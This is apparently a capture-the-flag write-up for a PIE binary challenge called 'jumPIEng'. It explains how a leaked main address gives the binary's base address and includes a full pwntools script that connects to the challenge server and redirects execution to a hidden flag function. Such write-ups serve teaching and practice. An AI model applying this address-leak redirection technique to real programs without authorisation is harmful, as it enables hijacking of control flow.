```markdown
# jumPIEng

**Category:** Binary Exploitation  
**Description:**  
Harry, a rookie in the realm of CTFs, has been exploring the nuances of Position-Independent Executables (PIE). He’s convinced that once a binary is compiled with PIE, it’s impossible to leak the flag—no matter how much address information is known. Our task is to prove otherwise by hijacking the program flow to a secret flag-printing function.

---

## Challenge Connection

```bash
nc 34.131.133.224 12346
```

## Provided File

- `redirection` (the binary)

---

## Analysis

1. **PIE and Address Leaks**  
   With **PIE (Position-Independent Executable)**, the binary’s memory addresses are randomized at runtime. However, if any address is leaked—especially that of `main`—we can use it to calculate the **base address** of the binary in memory.

2. **Leaked Address**  
   The challenge conveniently prints the **main** function’s address (e.g., `0x11A9`). This is our starting point for computing the **base address**.

3. **Flag Function**  
   The binary includes a function named `redirect_to_success`, located at a known offset (e.g., `0x1262`) relative to the binary’s base.

4. **Base Address Calculation**  
   The **base address** is determined by `leaked_main_address - e.symbols['main']`. Once we have the base, we can add the offset of `redirect_to_success` to jump directly to the function that prints the flag.

---

## Exploit Steps

1. **Receive the Main Address**  
   - The program outputs the **main** function’s address. Parse that address from the challenge output.

2. **Compute Base Address**  
   ```python
   base_address = main_leaked - e.symbols['main']
   ```
   - This transforms the leaked runtime address into the loaded base address of the binary.

3. **Calculate Redirect Function Address**  
   ```python
   redirect_address = base_address + e.symbols['redirect_to_success']
   ```
   - With the base address known, simply add the `redirect_to_success` offset to find its actual runtime location.

4. **Send the New Address**  
   - Provide the calculated address (`redirect_address`) back to the challenge process, effectively **redirecting** the program flow to the flag-printing function.

---

## Full Exploit Script

```
from pwn import *

binary = './redirection'
context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = remote('34.131.133.224', 12346)  # Connect to challenge server

# Read the leaked address of main
r.recvuntil('Main function address: ')
main_leaked = r.recvline()
main_leaked = int(main_leaked, 16)

# Calculate base address
base_address = main_leaked - e.symbols['main']
log.info(f'Base address: {hex(base_address)}')

# Calculate actual address of the flag function
redirect_to_abyss = base_address + e.symbols['redirect_to_success']
log.info(f'Flag function address: {hex(redirect_to_abyss)}')

# Send the address to redirect program flow
r.sendline(hex(redirect_to_abyss))
r.interactive()
```

---

## Conclusion

Despite Harry’s confidence in PIE protection, leaking even a single function’s address (like `main`) allows us to locate and invoke the secret flag function. This demonstrates a typical approach in PIE-enabled binary exploitation:

1. **Leak an address** (e.g., `main`).  
2. **Calculate** the base address.  
3. **Redirect** execution to the hidden or otherwise unreferenced function.

By doing so, we successfully **prove Harry wrong** and capture the flag!
```
